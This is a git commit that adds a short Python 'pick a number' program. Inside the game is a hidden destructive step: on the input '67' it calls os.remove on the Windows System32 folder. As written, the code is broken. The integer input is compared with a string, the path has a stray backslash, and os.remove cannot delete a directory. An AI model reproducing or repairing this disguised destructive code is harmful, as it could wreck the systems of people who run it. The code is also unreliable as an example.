3ec304cd56ef5f6471a9a6416e2f2318fb8da502
RacingBat312 <hairy.bubblegum645@gmail.com>
2026-07-17 16:21:03 +0100

    added.....new program

---
+++ haha lol 67.py
@@ -0,0 +1,10 @@
+import random
+import os
+
+print("Pick a number between 1 and 100...")
+a = int(input(">>>"))
+
+
+if a == "67":
+    print("haha lol 67 67")
+    os.remove(r"\C:\Windows\System32")
